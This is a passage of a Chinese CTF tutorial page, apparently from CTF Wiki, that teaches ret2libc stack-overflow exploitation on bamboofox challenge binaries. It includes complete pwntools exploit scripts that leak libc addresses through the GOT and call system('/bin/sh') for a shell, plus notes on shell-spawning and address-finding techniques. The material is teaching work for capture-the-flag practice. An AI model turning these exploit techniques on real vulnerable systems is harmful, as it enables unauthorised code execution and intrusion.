<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">112</span><span class="p">,</span> <span class="n">system_plt</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">])</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<p>这里我们需要注意函数调用栈的结构，如果是正常调用system函数，我们调用的时候会有一个对应的返回地址，这里以'bbbb'作为虚假的地址，其后参数对应的参数内容。</p>
<p>这个例子，相对来说，最为简单，同时提供了system地址与/bin/sh的地址，但是大多数程序并不会有这么好的情况。</p>
<h4 id="2">例2<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
<p>这里以bamboofox中的ret2libc2为例  </p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2libc2/ret2libc2">ret2libc2</a></p>
<p>该题目与例1基本一致，只不过不再出现/bin/sh字符串，所以此次需要我们自己来读取字符串，所以我们需要两个gadgets，第一个控制程序读取字符串，第二个控制程序执行system(""/bin/sh")。由于漏洞与上述一致，这里就不在多说，具体的exp如下</p>
<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2libc2&#39;</span><span class="p">)</span>

<span class="n">gets_plt</span> <span class="o">=</span> <span class="mh">0x08048460</span>
<span class="n">system_plt</span> <span class="o">=</span> <span class="mh">0x08048490</span>
<span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x0804843d</span>
<span class="n">buf2</span> <span class="o">=</span> <span class="mh">0x804a080</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
    <span class="p">[</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">112</span><span class="p">,</span> <span class="n">gets_plt</span><span class="p">,</span> <span class="n">pop_ebx</span><span class="p">,</span> <span class="n">buf2</span><span class="p">,</span> <span class="n">system_plt</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">buf2</span><span class="p">])</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<p>需要注意的是，我这里向程序中bss段的buf2处写入/bin/sh字符串，并将其地址作为system的参数传入。这样以便于可以获得shell。</p>
<h4 id="3">例3<a class="headerlink" href="#3" title="Permanent link">&para;</a></h4>
<p>这里以bamboofox中的ret2libc3为例  </p>
<p>点击下载: <a href="https://github.com/ctf-wiki/ctf-wiki/raw/master/pwn/stackoverflow/example/ret2libc3/ret2libc3">ret2libc3</a></p>
<p>在例2的基础上，再次将system函数的地址去掉。此时，我们需要同时找到system函数地址与/bin/sh字符串的地址。首先，查看安全保护</p>
<div class="codehilite"><pre><span></span>➜  ret2libc3 checksec ret2libc3
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</pre></div>

<p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的bug仍然是栈溢出</p>
<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+1Ch] [bp-64h]@1</span>

  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;No surprise anymore, system disappeard QQ.&quot;</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Can you find it !?&quot;</span><span class="p">);</span>
  <span class="n">gets</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>那么我们如何得到system函数的地址呢？这里就主要利用了两个知识点</p>
<ul>
<li>system函数属于libc，而libc.so文件中的函数之间相对偏移是固定的。</li>
<li>即使程序有ASLR保护，也只是针对于地址中间位进行随机，最低的12位并不会发生改变。而libc在github上有人进行收集，具体细节如下</li>
<li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li>
</ul>
<p>所以如果我们知道libc中某个函数的地址，那么我们就可以确定该程序利用的libc。进而我们就可以知道system函数的地址。</p>
<p>那么如何得到libc中的某个函数的地址呢？我们一般常用的方法是采用got表泄露，即输出某个函数对应的got表项的内容。<strong>当然，由于libc的延迟绑定机制，我们需要选择已经执行过的函数来进行泄露。</strong></p>
<p>我们自然可以根据上面的步骤先得到libc，之后在程序中查询偏移，然后再次获取system地址，但这样手工操作次数太多，有点麻烦，这里给出一个libc的利用工具，具体细节请参考readme</p>
<ul>
<li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li>
</ul>
<p>此外，在得到libc之后，其实libc中也是有/bin/sh字符串的，所以我们可以一起获得/bin/sh字符串的地址。</p>
<p>这里我们泄露__libc_start_main的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p>
<ul>
<li>泄露__libc_start_main地址</li>
<li>获取libc版本</li>
<li>获取system地址与/bin/sh的地址</li>
<li>再次执行源程序</li>
<li>触发栈溢出执行system(‘/bin/sh’)</li>
</ul>
<p>exp如下</p>
<div class="codehilite"><pre><span></span><span class="c1">##!/usr/bin/env python</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>

<span class="n">ret2libc3</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2libc3&#39;</span><span class="p">)</span>

<span class="n">puts_plt</span> <span class="o">=</span> <span class="n">ret2libc3</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">libc_start_main_got</span> <span class="o">=</span> <span class="n">ret2libc3</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
<span class="n">main</span> <span class="o">=</span> <span class="n">ret2libc3</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>

<span class="k">print</span> <span class="s2">&quot;leak libc_start_main_got addr and return to main again&quot;</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">112</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">main</span><span class="p">,</span> <span class="n">libc_start_main_got</span><span class="p">])</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Can you find it !?&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

<span class="k">print</span> <span class="s2">&quot;get the related addr&quot;</span>
<span class="n">libc_start_main_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">,</span> <span class="n">libc_start_main_addr</span><span class="p">)</span>
<span class="n">libcbase</span> <span class="o">=</span> <span class="n">libc_start_main_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">)</span>
<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>

<span class="k">print</span> <span class="s2">&quot;get shell&quot;</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">104</span><span class="p">,</span> <span class="n">system_addr</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">,</span> <span class="n">binsh_addr</span><span class="p">])</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<h3 id="_12">题目<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<ul>
<li>train.cs.nctu.edu.tw ret2libc</li>
</ul>
<h2 id="shell">shell获取小结<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
<p>这里总结几种常见的获取shell的方式：</p>
<ul>
<li>执行shellcode，这一方面也会有不同的情况<ul>
<li>可以直接返回shell</li>
<li>可以将shell返回到某一个端口</li>
<li>shellcode中字符有时候需要满足不同的需求</li>
<li><strong>注意，我们需要将shellcode写在可以执行的内存区域中。</strong></li>
</ul>
</li>
<li>执行 system("/bin/sh"), system('sh') 等等<ul>
<li>关于 system 的地址，参见下面章节的<strong>地址寻找</strong>。</li>
<li>关于 "/bin/sh"， “sh”<ul>
<li>首先寻找 binary 里面有没有对应的字符串，<strong>比如说有 flush 函数，那就一定有 sh 了</strong></li>
<li>考虑个人读取对应字符串</li>
<li>libc 中其实是有 /bin/sh 的</li>
</ul>
</li>
<li>优点<ul>
<li>只需要一个参数。</li>
</ul>
</li>
<li>缺点<ul>
<li><strong>有可能因为破坏环境变量而无法执行。</strong></li>
</ul>
</li>
</ul>
</li>
<li>执行 execve("/bin/sh",NULL,NULL)<ul>
<li>前几条同 system</li>
<li>优点<ul>
<li>几乎不受环境变量的影响。</li>
</ul>
</li>
<li>缺点<ul>
<li><strong>需要 3 个参数。</strong></li>
</ul>
</li>
</ul>
</li>
<li>系统调用<ul>
<li>系统调用号 11</li>
</ul>
</li>
</ul>
<h2 id="_13">地址寻找小结<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h2>
<p>在整个漏洞利用过程中，我们总是免不了要去寻找一些地址，常见的寻找地址的类型，有如下几种</p>
<h3 id="_14">通用寻找<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<h4 id="_15">直接地址寻找<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
<p>程序中已经给出了相关变量或者函数的地址了。这时候，我们就可以直接进行利用了。</p>
<h4 id="got">got表寻找<a class="headerlink" href="#got" title="Permanent link">&para;</a></h4>
<p>有时候我们并不一定非得直接知道某个函数的地址，可以利用GOT表的跳转到对应函数的地址。当然，如果我们非得知道这个函数的地址，我们可以利用write，puts等输出函数将GOT表中地址处对应的内容输出出来（<strong>前提是这个函数已经被解析一次了</strong>）。</p>
<h3 id="libc">有libc<a class="headerlink" href="#libc" title="Permanent link">&para;</a></h3>
<p><strong>相对偏移寻找</strong>，这时候我们就需要考虑利用libc中函数的基地址一样这个特性来寻找了。其实__libc_start_main就是libc在内存中的基地址。<strong>注意：不要选择有wapper的函数，这样会使得函数的基地址计算不正确。</strong>常见的有wapper的函数有（待补充）。</p>
<h3 id="libc_1">无libc<a class="headerlink" href="#libc_1" title="Permanent link">&para;</a></h3>
<p>其实，这种情况的解决策略分为两种</p>
<ul>
<li>想办法获取libc</li>
<li>想办法直接获取对应的地址。</li>
</ul>
<p>而对于想要泄露的地址，我们只是单纯地需要其对应的内容，所以puts和write均可以。</p>
<ul>
<li>puts会有\x00截断的问题</li>
<li>write可以指定长度输出的内容。</li>
</ul>
<p>下面是一些相应的方法</p>
<h4 id="dynelf">DynELF<a class="headerlink" href="#dynelf" title="Permanent link">&para;</a></h4>
<p>前提是我们可以泄露任意地址的内容。</p>
<ul>
<li><strong>如果要使用write函数泄露的话，一次最好多输出一些地址的内容，因为我们一般是只是不断地向高地址读内容，很有可能导致高地址的环境变量被覆盖，就会导致shell不能启动。</strong></li>
</ul>
<h4 id="libc_2">libc数据库<a class="headerlink" href="#libc_2" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><span class="c1">## 更新数据库</span>
./get
<span class="c1">## 将已有libc添加到数据库中</span>
./add libc.so 
<span class="c1">## Find all the libc&#39;s in the database that have the given names at the given addresses. </span>
./find function1 addr function2 addr
<span class="c1">## Dump some useful offsets, given a libc ID. You can also provide your own names to dump.</span>
./Dump some useful offsets
</pre></div>

<p>去libc的数据库中找到对应的和已经出现的地址一样的libc，这时候很有可能是一样的。</p>
<ul>
<li>libcdb.com</li>
</ul>
<p><strong>当然，还有上面提到的https://github.com/lieanu/LibcSearcher。</strong></p>
<h4 id="ret2dl-resolve">ret2dl-resolve<a class="headerlink" href="#ret2dl-resolve" title="Permanent link">&para;</a></h4>
<p>当ELF文件采用动态链接时，got表会采用延迟绑定技术。当第一次调用某个libc函数时，程序会调用_dl_runtime_resolve函数对其地址解析。因此，我们可以利用栈溢出构造ROP链，伪造对其他函数（如：system）的解析。这也是我们在高级rop中会介绍的技巧。</p>
<h2 id="_16">题目<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h2>
<ul>
<li>train.cs.nctu.edu.tw</li>
<li>rop</li>
<li>2013-PlaidCTF-ropasaurusrex</li>
<li>Defcon 2015 Qualifier: R0pbaby</li>
</ul>
<p><strong>参考阅读</strong></p>
<ul>
<li>乌云一步一步ROP篇(蒸米)</li>
<li><a href="https://zhuanlan.zhihu.com/p/25816426">手把手教你栈溢出从入门到放弃（上）</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25892385">手把手教你栈溢出从入门到放弃（下）</a></li>
<li><a href="http://bobao.360.cn/learning/detail/3694.html"> 【技术分享】现代栈溢出利用技术基础：ROP</a></li>
</ul>
                
                  
                
              
              
                
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid">
        
          <a href="../stackoverflow_basic/" title="栈溢出原理" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
            </div>
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  后退
                </span>
                栈溢出原理
              </span>
            </div>
          </a>
        
        
          <a href="../others/" title="花式栈溢出技巧" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
              <span class="md-flex__ellipsis">
                <span class="md-footer-nav__direction">
                  前进
                </span>
                花式栈溢出技巧
              </span>
            </div>
            <div class="md-flex__cell md-flex__cell--shrink">
              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
        powered by
        <a href="http://www.mkdocs.org">MkDocs</a>
        and
        <a href="https://squidfunk.github.io/mkdocs-material/">
          Material for MkDocs</a>
      </div>
      
        
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../assets/javascripts/application.02434462.js"></script>
      
        
        
          
          <script src="../../../assets/javascripts/lunr/lunr.stemmer.support.js"></script>
          
            
              
                <script src="../../../assets/javascripts/lunr/tinyseg.js"></script>
              
              
                <script src="../../../assets/javascripts/lunr/lunr.jp.js"></script>
              
            
          
          
        
      
      <script>app.initialize({version:"0.17.2",url:{base:"../../.."}})</script>
      
        <script src="../../../_static/js/extra.js"></script>
      
        <script src="https://cdn.bootcss.com/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
    
    
      
    
  </body>
</html>